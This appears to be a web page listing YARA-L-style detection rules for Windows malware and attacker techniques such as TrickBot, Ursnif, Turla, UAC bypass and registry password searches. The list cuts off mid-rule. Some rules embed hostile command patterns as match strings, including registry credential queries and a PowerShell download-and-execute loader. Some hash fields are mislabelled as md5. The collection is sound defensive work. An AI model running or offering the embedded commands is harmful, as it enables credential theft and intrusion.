<li><a href="#">rule system_file_execution_location_anomaly { meta: author = "Florian Roth" description = "Detects a Windows program executable started in a suspicious folder License: ." reference = "" version = "0.01" created = "2017/11/27" category = "process_creation" product = "windows" mitre = "defense_evasion" events: (((re.regex($selection.target.process.file.full_path, `.*\\svchost\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\rundll32\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\services\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\regsvr32\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\spoolsv\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\lsass\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\smss\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\csrss\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\conhost\.exe`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not ((re.regex($selection.target.process.file.full_path, `.*\\System32\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\SysWow64\\.*`)))) condition: $selection 
<li><a href="#">rule system_information_gathering_via_wmicexe { meta: author = "Ariel Millahuel" description = "Detects the utilization of wmic.exe in order to obtain specific system information. This action is related to the \"System Information Discovery\" Technique License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, discovery, t1064, t1082" events: (re.regex($selection1.target.process.file.full_path, `.*wmic\.exe`) and (re.regex($selection1.target.process.command_line, `.* .* DESKTOPMONITOR get pnpdeviceid .*`) or re.regex($selection1.target.process.command_line, `.* .* SOUNDDEV get pnpdeviceid .*`) or re.regex($selection1.target.process.command_line, `.* .* bios get serialnumber .*`) or re.regex($selection1.target.process.command_line, `.* .* baseboard get serialnumber .*`) or re.regex($selection1.target.process.command_line, `.* .* diskdrive get pnpdeviceid .*`) or re.regex($selection1.target.process.command_line, `.* .* cpu get processorid .*`)) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) condition: $selection1 
<li><a href="#">rule t1214__credentials_in_registry { meta: author = "Ariel Millahuel" description = "This rule detects an attempt to scanning registry hives for the value password License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "T1214, credential_access" events: ($selection1.target.process.file.full_path = "reg.exe" and ($selection1.target.process.command_line = "reg query HKLM /f password /t REG_SZ /s" or $selection1.target.process.command_line = "reg query HKCU /f password /t REG_SZ /s") and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) condition: $selection1 
<li><a href="#">rule ta505_group_targets_the_us_retail_industry_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "TA505 Group targets the US retail industry. License: ." reference = "" version = "0.01" created = "2018/12/06" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "9206f08916ab6f9708d81a6cf2f916e2f606fd048a6b2355a39db97e258d0883" or $selection.target.file.md5 = "06c637ac62cab511c5c42e142855ba0447a1c8ac8ee4b0f1f8b00faa5310fe9f" or $selection.target.file.md5 = "609b0a416f9b16a6df9b967dc32cd739402af31566e019a8fb8abdf3cb573e30")) condition: $selection 
<li><a href="#">rule terminal_service_process_spawn { meta: author = "Florian Roth" description = "Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708) License: ." reference = "" version = "0.01" created = "2019/05/22" product = "windows" category = "process_creation" mitre = "car.2013-07-002" events: ((re.regex($selection.src.process.command_line, `.*\\svchost\.exe.*termsvcs`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not (re.regex($selection.target.process.file.full_path, `.*\\rdpclip\.exe`))) condition: $selection 
<li><a href="#">rule the_gocgle_malicious_campaign { meta: author = "Osman Demir" description = "Detects Web Skimming Attacks License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "T1056, Collection" events: (($selection.src.hostname = "gocgle-analytics.net" or $selection.src.hostname = "googlo-analytics.com" or $selection.src.hostname = "gocgletagmanager.com" or $selection.src.hostname = "googlc-analytics.com" or $selection.src.hostname = "gocgle-analytics.cm" or $selection.src.hostname = "gocgletagmanager.cm" or $selection.src.hostname = "gocgle-analytics.com" or $selection.src.hostname = "analytic.is" or $selection.src.hostname = "qdtf54y6eu7i87t.ga") or ($selection.target.ip = "5.188.9.61" or $selection.target.ip = "5.188.9.33" or $selection.target.ip = "5.188.9.40" or $selection.target.ip = "194.180.224.112")) condition: $selection 
<li><a href="#">rule trickbot_behaviour_privilege_escalation_attack { meta: author = "Ariel Millahuel" description = "Detects \"Trickbot\" tactics related to privilege escalation attacks. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "defense_evasion, privilege_escalation, t1036" events: (($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.* .*\\Microsoft\\Windows\\DRM.*`) or re.regex($selection1.target.file.full_path, `.* .*\\Microsoft\\Network\\Downloader.*`) or re.regex($selection1.target.file.full_path, `.* C:\\Users.*\\AppData\\Roaming\\CloudApp.*\.exe .*`))) or ($selection1.metadata.product_event_type = "13" and re.regex($selection1.target.registry.registry_key, `.* .*\\SYSTEM\\CurrentControlSet\\services\\SSDPSRV.*`) and $selection1.metadata.event_type = "SetValue")) condition: $selection1 
<li><a href="#">rule trickbot_malware_detector_sysmon_behavior_july_2019 { meta: author = "Lee Archinal" description = "This content detects characteristics of the TrickBot Malware that was found in July 2019 License: ." reference = "" version = "0.01" created = "2019/08/07" product = "windows" service = "sysmon" mitre = "defenense_evasion, t1112" events: (($selection1.metadata.product_event_type = "13" and $selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\MICROSOFT\\SYSTEMCERTIFICATES\\AUTHROOT\\CERTIFICATES\\DAC9024F54D8F6DF94935FB1732638CA6AD77C13" and $selection1.metadata.description = "Blob") or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*Modules.*`) or re.regex($selection1.target.file.full_path, `.*client_id.*`) or re.regex($selection1.target.file.full_path, `.*group_tag.*`) or re.regex($selection1.target.file.full_path, `.*\\Tasks\\Bot.*`) or re.regex($selection1.target.file.full_path, `.*\\config\\systemprofile\\AppData\\Roaming\\client_id`) or re.regex($selection1.target.file.full_path, `.*\\config\\systemprofile\\AppData\\Roaming\\group_tag`) or re.regex($selection1.target.file.full_path, `.*\\Tasks\\Bot\.job`)))) condition: $selection1 
<li><a href="#">rule troldesh_ransomware_detector_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "TROLDESH Ransomware Detector. License: ." reference = "" version = "0.01" created = "2018/02/28" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059, Defense Evasion, t1112, Impact, t1486" events: (($selection1.metadata.product_event_type = "1" and ($selection1.target.file.md5 = "e577944c48edfc65b6f59630b0b0ac625b997f26af3d4bdbe2f534be0fff6f34" or (re.regex($selection1.target.process.file.full_path, `.*\\cmd\.exe`) and re.regex($selection1.target.process.command_line, `.*/c C:\\Users\\admin\\AppData\\Local\\Temp\\rad.*`)))) or ($selection1.metadata.product_event_type = "13" and (re.regex($selection1.target.registry.registry_key, `.*\\Software\\System32\\Configuration\\xi`) or re.regex($selection1.target.registry.registry_key, `.*\\SOFTWARE\\System32\\Configuration\\xi`)) and $selection1.metadata.description = "906D0F2E2F604F839E04" and $selection1.metadata.event_type = "SetValue")) condition: $selection1 
<li><a href="#">rule tunnel_rdp_out_port_443 { meta: author = "Emir Erdogan" description = "Using RDP To Access Servers Over 443 License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1076" events: ($selection.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" and $selection.target.process.file.full_path = "C:\\Windows\\System32\\reg.exe" and re.regex($selection.target.process.command_line, `reg add .*\\Control\\TerminalServer\\WinStations\\RDP-Tcp.* /v PortNumber /t REG_DWORD /d 443 /f`)) condition: $selection 
<li><a href="#">rule turla_backdoor_sysmon { meta: author = "Dmitriy Dyakon, SOC Prime" description = "Turla Backdoor Detector. License: ." reference = "" version = "0.01" created = "2018/01/02" product = "windows" service = "sysmon" mitre = "T1064, T1100, Command and Control" events: ($selection_hashes.metadata.product_event_type = "1" and ($selection_hashes.target.file.md5 = "fd898c5a4cd57c3e9cef41f6fd4f71a7" or $selection_hashes.target.file.md5 = "9dab3dd7b7e7f4980397da908fbc9ff7" or $selection_hashes.target.file.md5 = "3eb5f44492ce1147790450d950954a52")) condition: $selection_hashes 
<li><a href="#">rule turla_scheduled_task_and_host_fingerprinting_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "Detects characteristics of the Turla strain of malware License: ." reference = "" version = "0.01" created = "2019/07/17" product = "windows" service = "sysmon" mitre = "Execution, t1059, t1065, t1129, Persistence, t1050, Privilege_Escalation, t1055, Defense_Evasion" events: (($selection1.metadata.product_event_type = "1" and ((re.regex($selection1.target.process.file.full_path, `.*cmd\.exe`) and ($selection1.target.process.command_line = "cmd.exe /c schtasks /creaet /SC MINUTE /MO 30 /TR %localappdata%\\\\VirtualStore\\\\certcheck.exe /TN VerifiedPublisherCertCheck /F" or re.regex($selection1.target.process.command_line, `cmd\.exe /c net use .*\\c$ .* /user:administrator & copy /y .*\\c$\\users\\public\\documents\\i\.js $documents\\j\.js & $documents\\j\.js`))) or ($selection1.target.process.command_line = "tasklist /v" or $selection1.target.process.command_line = "gpresult /z" or $selection1.target.process.command_line = "dir \\x22%programfiles%\\x5cKaspersky Lab\\x22" or $selection1.target.process.command_line = "tracert www.google.com"))) or ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Roaming\\Microsofx5ct235\.dat`))) condition: $selection1 
<li><a href="#">rule uac_bypass_via_event_viewer { meta: author = "Florian Roth" description = "Detects UAC bypass method using Windows event viewer License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "defense_evasion, privilege_escalation, t1088" events: (($methregistry.metadata.product_event_type = "13" and re.regex($methregistry.target.registry.registry_key, `HKEY_USERS\\.*\\mscfile\\shell\\open\\command`)) or (($methregistry.metadata.product_event_type = "1" and re.regex($methregistry.src.process.file.full_path, `.*\\eventvwr\.exe`)) and not (re.regex($methregistry.target.process.file.full_path, `.*\\mmc\.exe`)))) condition: $methregistry 
<li><a href="#">rule uac_bypass_via_sdclt { meta: author = "Omer Yampel" description = "Detects changes to HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "defense_evasion, privilege_escalation, t1088, car.2019-04-001" events: ($selection.metadata.product_event_type = "13" and re.regex($selection.target.registry.registry_key, `HKEY_USERS\\.*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand`)) condition: $selection 
<li><a href="#">rule unauthenticated_file_read_in_cisco_asa__cisco_firepower_cve20203452_via_web { meta: author = "Roman Ranskyi" description = "Detects CVE-2020-3452, path traversal exploitation attempt against Cisco ASA & Cisco Firepower. Need to watch internal and external exploitation attempts. For more generic path traversal detection need to take away selection_patterns part. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "webserver" mitre = "initial_access, t1190" events: ((re.regex($selection_traversal.target.url, `.*\.\./.*`) or re.regex($selection_traversal.target.url, `.*/\.\..*`) or re.regex($selection_traversal.target.url, `.*=\.\.&.*`)) and re.regex($selection_traversal.target.url, `.*CSCOE.*`)) condition: $selection_traversal 
<li><a href="#">rule underminer_exploit_kit_delivers_malware { meta: author = "Emir Erdogan" description = "Underminer Exploit Kit Delivers Malware by using SSL Certificate Authority along with the SSL Subject of user.shorico.club License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "persistence, t1050, T1189" events: (($selection1.target.process.file.full_path = "C:\\Windows\\System32\\regsvr32.exe" or $selection1.target.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" or re.regex($selection1.target.process.file.full_path, `.*powershell\.exe.*`)) and $selection1.src.process.file.full_path = "C:\\Program Files\\Internet Explorer\\iexplore.exe" and re.regex($selection1.target.process.command_line, `.*6ke4ua62j0vmgeq6ld84ri257o\.sct.*`)) condition: $selection1 
<li><a href="#">rule unusual_searchprotocolhost_child_process_via_cmdline { meta: author = "SOC Prime Team, Fireeye" description = "This alert looks for suspicious child processes of searchprotocolhost.exe, a known process used by malicious actors for process injection. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, t1055" events: (re.regex($selection.src.process.file.full_path, `.*SearchProtocolHost\.exe`) and (re.regex($selection.target.process.file.full_path, `.*wscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*cscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*cmd\.exe`) or re.regex($selection.target.process.file.full_path, `.*wmic\.exe`) or re.regex($selection.target.process.file.full_path, `.*java\.exe`) or re.regex($selection.target.process.file.full_path, `.*py\.exe`) or re.regex($selection.target.process.file.full_path, `.*bash\.exe`) or re.regex($selection.target.process.file.full_path, `.*rundll32\.exe`) or re.regex($selection.target.process.file.full_path, `.*AppVLP\.exe`) or re.regex($selection.target.process.file.full_path, `.*Cmstp\.exe`) or re.regex($selection.target.process.file.full_path, `.*Esentutl\.exe`) or re.regex($selection.target.process.file.full_path, `.*Eventvwr\.exe`) or re.regex($selection.target.process.file.full_path, `.*InfDefaultInstall\.exe`) or re.regex($selection.target.process.file.full_path, `.*Installutil\.exe`) or re.regex($selection.target.process.file.full_path, `.*Mavinject\.exe`) or re.regex($selection.target.process.file.full_path, `.*Microsoft\.Workflow\.Compiler\.exe`) or re.regex($selection.target.process.file.full_path, `.*Msbuild\.exe`) or re.regex($selection.target.process.file.full_path, `.*Odbcconf\.exe`) or re.regex($selection.target.process.file.full_path, `.*Presentationhost\.exe`) or re.regex($selection.target.process.file.full_path, `.*SQLToolsPS\.exe`) or re.regex($selection.target.process.file.full_path, `.*Sqlps\.exe`) or re.regex($selection.target.process.file.full_path, `.*SyncAppvPublishingServer\.exe`) or re.regex($selection.target.process.file.full_path, `.*atbroker\.exe`) or re.regex($selection.target.process.file.full_path, `.*bginfo\.exe`) or re.regex($selection.target.process.file.full_path, `.*bitsadmin\.exe`) or re.regex($selection.target.process.file.full_path, `.*cdb\.exe`) or re.regex($selection.target.process.file.full_path, `.*cmstp\.exe`) or re.regex($selection.target.process.file.full_path, `.*csi\.exe`) or re.regex($selection.target.process.file.full_path, `.*devtoolslauncher\.exe`) or re.regex($selection.target.process.file.full_path, `.*dnscmd\.exe`) or re.regex($selection.target.process.file.full_path, `.*dnx\.exe`) or re.regex($selection.target.process.file.full_path, `.*dxcap\.exe`) or re.regex($selection.target.process.file.full_path, `.*extexport\.exe`) or re.regex($selection.target.process.file.full_path, `.*forfiles\.exe`) or re.regex($selection.target.process.file.full_path, `.*ftp\.exe`) or re.regex($selection.target.process.file.full_path, `.*hh\.exe`) or re.regex($selection.target.process.file.full_path, `.*ieexec\.exe`) or re.regex($selection.target.process.file.full_path, `.*installutil\.exe`) or re.regex($selection.target.process.file.full_path, `.*jjs\.exe`) or re.regex($selection.target.process.file.full_path, `.*mavinject\.exe`) or re.regex($selection.target.process.file.full_path, `.*mftrace\.exe`) or re.regex($selection.target.process.file.full_path, `.*msbuild\.exe`) or re.regex($selection.target.process.file.full_path, `.*msxsl\.exe`) or re.regex($selection.target.process.file.full_path, `.*odbcconf\.exe`) or re.regex($selection.target.process.file.full_path, `.*pcalua\.exe`) or re.regex($selection.target.process.file.full_path, `.*presentationhost\.exe`) or re.regex($selection.target.process.file.full_path, `.*rcsi\.exe`) or re.regex($selection.target.process.file.full_path, `.*regasm\.exe`) or re.regex($selection.target.process.file.full_path, `.*regsvcs\.exe`) or re.regex($selection.target.process.file.full_path, `.*runonce\.exe`) or re.regex($selection.target.process.file.full_path, `.*runscripthelper\.exe`) or re.regex($selection.target.process.file.full_path, `.*schtasks\.exe`) or re.regex($selection.target.process.file.full_path, `.*scriptrunner\.exe`) or re.regex($selection.target.process.file.full_path, `.*squirrel\.exe`) or re.regex($selection.target.process.file.full_path, `.*te\.exe`) or re.regex($selection.target.process.file.full_path, `.*tracker\.exe`) or re.regex($selection.target.process.file.full_path, `.*update\.exe`) or re.regex($selection.target.process.file.full_path, `.*verclsid\.exe`) or re.regex($selection.target.process.file.full_path, `.*vsjitdebugger\.exe`) or re.regex($selection.target.process.file.full_path, `.*wab\.exe`) or re.regex($selection.target.process.file.full_path, `.*wmic\.exe`) or re.regex($selection.target.process.file.full_path, `.*wsl\.exe`) or re.regex($selection.target.process.file.full_path, `.*xwizard\.exe`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule unusual_solarwinds_child_process_via_cmdline { meta: author = "SOC Prime Team, Fireeye" description = "This rule was converted from the FireEye hxioc rule. This rule identifies unusual solarwinds child processes. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "initial_access, t1195.002" events: ((re.regex($selection.src.process.file.full_path, `.*\\solarwinds\.businesslayerhost\.exe`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not ((re.regex($selection.target.process.file.full_path, `.*\\SolarWinds\\Orion\\APM\\APMServiceControl\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\SolarWinds\\Orion\\ExportToPDFCmd\.Exe`) or re.regex($selection.target.process.file.full_path, `.*\\SolarWinds\.Credentials\\SolarWinds\.Credentials\.Orion\.WebApi\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\SolarWinds\\Orion\\Topology\\SolarWinds\.Orion\.Topology\.Calculator\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\SolarWinds\\Orion\\Database-Maint\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\SolarWinds\.Orion\.ApiPoller\.Service\\SolarWinds\.Orion\.ApiPoller\.Service\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\SysWOW64\\WerFault\.exe`)))) condition: $selection 
<li><a href="#">rule unusual_solarwinds_file_creation_via_filewrite { meta: author = "SOC Prime Team, Fireeye" description = "This rule was converted from the FireEye hxioc rule. This rule identifies unusual file write events by a Solar Winds executable. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "file_event" product = "windows" mitre = "initial_access, t1195.002" events: ((re.regex($selection.target.process.file.full_path, `.*\\solarwinds\.businesslayerhost\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\SolarWindws\.BusinessLayerHostx64\.exe`)) and (re.regex($selection.target.file.full_path, `.*\.exe`) or re.regex($selection.target.file.full_path, `.*\.jpg`) or re.regex($selection.target.file.full_path, `.*\.ps1`) or re.regex($selection.target.file.full_path, `.*\.png`) or re.regex($selection.target.file.full_path, `.*\.dll`))) condition: $selection 
<li><a href="#">rule ursnif { meta: author = "megan201296" description = "Detects new registry key created by Ursnif malware. License: ." reference = "" version = "0.01" created = "2019/02/13" product = "windows" service = "sysmon" mitre = "execution, t1112" events: ($selection.metadata.product_event_type = "13" and re.regex($selection.target.registry.registry_key, `.*\\Software\\AppDataLow\\Software\\Microsoft\\.*`)) condition: $selection 
<li><a href="#">rule ursnif_malware_detector_sysmon { meta: author = "Lee Archinal" description = "This detects the Ursnif malware License: ." reference = "" version = "0.01" created = "2019/05/31" product = "windows" service = "sysmon" mitre = "execution, t1059" events: ($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" and ($selection1.target.process.command_line = " POWERSHELL " or $selection1.target.process.command_line = "ExecutionPolicy" or $selection1.target.process.command_line = "encodedcommand JAB" or $selection1.target.process.command_line = "JAB")) condition: $selection1 
<li><a href="#">rule ursnif_trojan_detection_cmd_obfuscation { meta: author = "Emir Erdogan" description = "Most popular banking trojan which is called as ursnif uses obfuscated command prompt License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1047, T1497, T1080, T1007, T1082, T1071, T1064, T1113, T1091, T1105, T1060, T1012, T1093, T1027, T1036" events: ($selection.target.process.file.full_path = "C:\\Windows\\System32\\Rundll32.exe" and re.regex($selection.src.process.file.full_path, `C:\\Windows\\System32\\cmd\.exe.*`) and re.regex($selection.target.process.command_line, `.*C:\\ProgramData\\ZyGHisczAWv\.dll,Dl^lRegi^sterSe^rver.*`)) condition: $selection 
<li><a href="#">rule usage_of_sysinternals_tools { meta: author = "Markus Neis" description = "Detects the usage of Sysinternals Tools due to accepteula key beeing added to Registry License: ." reference = "" version = "0.01" created = "2017/08/28" product = "windows" service = "sysmon" events: (($selection1.metadata.product_event_type = "13" and re.regex($selection1.target.registry.registry_key, `.*\\EulaAccepted`)) or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.command_line, `.* -accepteula.*`))) condition: $selection1 
<li><a href="#">rule usb_device_plugged { meta: author = "Florian Roth" description = "Detects plugged USB devices License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "driver-framework" events: ($selection.metadata.product_event_type = "2003" or $selection.metadata.product_event_type = "2100" or $selection.metadata.product_event_type = "2102") condition: $selection 
<li><a href="#">rule usb_file_stealer_usbguard_detector_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "It is a small, standalone program that monitors USB drives connected to the computer and copies all files that match the filter chosen by the attackers. License: ." reference = "" version = "0.01" created = "2018/06/01" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "050EB7D20EE8EF1E1DAEE2F421E5BF648FB645DF" or $selection.target.file.md5 = "069A919B3BC8070BB2D71D3E1AD9F7642D8ECF0F" or $selection.target.file.md5 = "0D265E0BDA9DF83815759ABCA64938EC0FF65733" or $selection.target.file.md5 = "0D7DF910D0FB7B100F084BFB8DFA0A9F2371171A" or $selection.target.file.md5 = "2FF3F5DA2960BE95E50B751680F450896AD1ED67" or $selection.target.file.md5 = "3200ECC7503F184F72AB9DA1DC3E1F8D43DDFD48" or $selection.target.file.md5 = "46D256EF277328E803D2B15CA7C188267059949D" or $selection.target.file.md5 = "524EE1B7269D02F725E55254A015200BB472463A" or $selection.target.file.md5 = "53A0EFD3D448DA8E32CFDDA5848312D3CF802B06" or $selection.target.file.md5 = "6FC150A9CAFA75813E7473C687935E7E4A5DCE24" or $selection.target.file.md5 = "70559245303F99630A27CB47B328C20C9666F0BB" or $selection.target.file.md5 = "7D8044A5CBEFE3B016F2132A5750C30BB647E599" or $selection.target.file.md5 = "8FD919D531A7A80615517E1AC13C2D0F050AF20D" or $selection.target.file.md5 = "9D22421DA9696B535C708178C72323F64D31FC80" or $selection.target.file.md5 = "BFD2DFA3D6AF31DF4B9CC2F6B31B239ADF1CECA1" or $selection.target.file.md5 = "C08A6222B59A187F3CF27A7BAE4CACFACC97DDEE" or $selection.target.file.md5 = "C2F6A65E14605828880927B9BA3C386507BD8161" or $selection.target.file.md5 = "C562006D2FA53B15052A4B80C94B86355CCA7427" or $selection.target.file.md5 = "CB43058D9EBB517832DF7058641AEDF6B303E736" or $selection.target.file.md5 = "CC8A9C28E884FDA0E1B3F6CEAB12805FEA17D3C1" or $selection.target.file.md5 = "D3CC27CA772E30C6260C5A3B6309D27F08A295CD" or $selection.target.file.md5 = "E7A2DE3776BA7D939711E620C7D6AB25946C9881" or $selection.target.file.md5 = "EE6EFA7A6A85A1B2FA6351787A1612F060086320" or $selection.target.file.md5 = "EF0ABB3A0CD1E65B33C0F109DD18F156FC0F0CDE" or $selection.target.file.md5 = "F63BE193C8A0FBB430F3B88CC8194D755BAD9CD1")) condition: $selection 
<li><a href="#">rule using_bashexe_in_windows { meta: author = "Amir heidari" description = "This content monitor usage of the bash.exe that could be malicious License: ." reference = "" version = "0.01" created = "2020/02/22" product = "windows" service = "sysmon" events: ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*\\\\bash\.exe`)) condition: $selection1 
<li><a href="#">rule using_rasman_remote_access_connection_manager_windows_service_to_register_dll { meta: author = "Den Iuzvyk" description = "Detects using RasMan (Remote Access Connection Manager) Windows service to register DLL License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "attck.persistence, attck.t1031" events: ($selection_reg1.metadata.product_event_type = "13" and re.regex($selection_reg1.target.registry.registry_key, `.*\\SYSTEM\\CurrentControlSet\\services\\RasMan\\ThirdParty\\DllName`) and $selection_reg1.metadata.event_type = "SetValue" and re.regex($selection_reg1.metadata.description, `.*\.dll`)) condition: $selection_reg1 
<li><a href="#">rule vba_dll_loaded_via_microsoft_word { meta: author = "Antonlovesdnb" description = "Detects DLL's Loaded Via Word Containing VBA Macros License: ." reference = "" version = "0.01" created = "2020/02/19" product = "windows" service = "sysmon" mitre = "initial_access, t1193" events: ($selection.metadata.product_event_type = "7" and (re.regex($selection.target.process.file.full_path, `.*\\winword\.exe.*`) or re.regex($selection.target.process.file.full_path, `.*\\powerpnt\.exe.*`) or re.regex($selection.target.process.file.full_path, `.*\\excel\.exe.*`) or re.regex($selection.target.process.file.full_path, `.*\\outlook\.exe.*`)) and (re.regex($selection.target.process.file.full_path, `.*\\VBE7\.DLL.*`) or re.regex($selection.target.process.file.full_path, `.*\\VBEUI\.DLL.*`) or re.regex($selection.target.process.file.full_path, `.*\\VBE7INTL\.DLL.*`))) condition: $selection 
<li><a href="#">rule vbsbased_malware_infection { meta: author = "Emir Erdogan" description = "Visual Basic Script opens powershell and downloads malware from C2 server License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1064, T1086, T1179" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*powershell\.exe`) and $selection.src.process.file.full_path = "C:\\Windows\\System32\\wscript.exe" and re.regex($selection.target.process.command_line, `\".*powershell\.exe\" iujby=\"tsgw\";iex \( [string][System\.Text\.Encoding]::ASCII\.GetString\([System\.Convert]::FromBase64String\( \(\(New-Object Net\.WebClient\)\.DownloadString.*`) and $selection.target.file.md5 = "SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C") condition: $selection 
<li><a href="#">rule vermin_backdoor_detector_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Vermin is a full-featured backdoor capable of stealing credentials, keylogging and recording audio. License: ." reference = "" version = "0.01" created = "2018/06/01" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "028EBDBEBAC7239B41A1F4CE8D2CC61B1E09983B" or $selection.target.file.md5 = "07E1AF6D3F7B42D2E26DF12A217DEBACEDB8B1B9" or $selection.target.file.md5 = "09457ACB28C754AA419AB6A7E8B1940201EF3FFE" or $selection.target.file.md5 = "0EEE92EC2723ED9623F84082DAD962778F4CF776" or $selection.target.file.md5 = "10128AB8770FBDECD81B8894208A760A3C266D78" or $selection.target.file.md5 = "131F99A2E18A358B60F09FD61EE312E74B02C07C" or $selection.target.file.md5 = "14F69C7BFAF1DF16E755CCF754017089238B0E7B" or $selection.target.file.md5 = "1509F85DE302BE83A47D5AFAD9BEE2542BA317FC" or $selection.target.file.md5 = "170CEE6523B6620124F52201D943D7D9CA7B95E5" or $selection.target.file.md5 = "191159F855A0E580290871C945245E3597A5F25C" or $selection.target.file.md5 = "1F12C32A41D82E978DE333CD4E93FDAA1396BE94" or $selection.target.file.md5 = "22B17966B597568DB46B94B253CD37CBCF561321" or $selection.target.file.md5 = "2C7332D8247376842BD1B1BD5298844307649C99" or $selection.target.file.md5 = "2E08BA5DF30C0718C1733A7836B5F4D98D84905E" or $selection.target.file.md5 = "2EDF808F8252A4CBCB92F47A0AEDC1AAAE79A777" or $selection.target.file.md5 = "360F54B33AC960EE29CA0557A28F6BB8417EF409" or $selection.target.file.md5 = "431FCE6A47D0A48A57F699AA084C9FF175A9D15F" or $selection.target.file.md5 = "45438834FDC5C690DA3BC1F60722BE86B871280D" or $selection.target.file.md5 = "4A8A8188E3A7A137651B24780DF37CB6F610CC19" or $selection.target.file.md5 = "4C1E4E136B7922F9E28D1B38E9760E28929E4F0B" or $selection.target.file.md5 = "5B6EA57FFC09593C3B65D903368EA5F7FAA2EB68" or $selection.target.file.md5 = "61D366939FE36861B2FECB38A4DFF6D86C925A00" or $selection.target.file.md5 = "6A72366D8AE09F72F0466FB59E8ED372F8B460D7" or $selection.target.file.md5 = "6FECA622B0FB282064F7DE42BA472A8EC908D0D6" or $selection.target.file.md5 = "70A772485C5ED330C6876FA901BA722CD44CA05E" or $selection.target.file.md5 = "70D97367A3DBD5D45482B6AF8C78C58B64D3F3B3" or $selection.target.file.md5 = "7803FD9753930522705F2B6B4E73622887892C28" or $selection.target.file.md5 = "7B11A84B18DC4B5F1F2826E7925F0B2DC1B936AE" or $selection.target.file.md5 = "889FD0BEB3197DDD6C88F5C40D6B8E4D74A892CE" or $selection.target.file.md5 = "9B6FBABFA2A77FA633F7A2EB352979D5C68CEBC6" or $selection.target.file.md5 = "A451291F17489E3A59F440A1B693D691B053C531" or $selection.target.file.md5 = "A53D77E55A06CF131D670339BACEC5AC0F0C6D66" or $selection.target.file.md5 = "A925D0AFB5D4F5FAC65543C993BE4172F1DBF329" or $selection.target.file.md5 = "B5F81C804E47B76C74C38DF03A5CBE8A4FE69A9A" or $selection.target.file.md5 = "B99DE55043099E9506B304660B8E1374787AB195" or $selection.target.file.md5 = "C00C104FC3E9F5977D11C67EF0C8C671D4DFC412" or $selection.target.file.md5 = 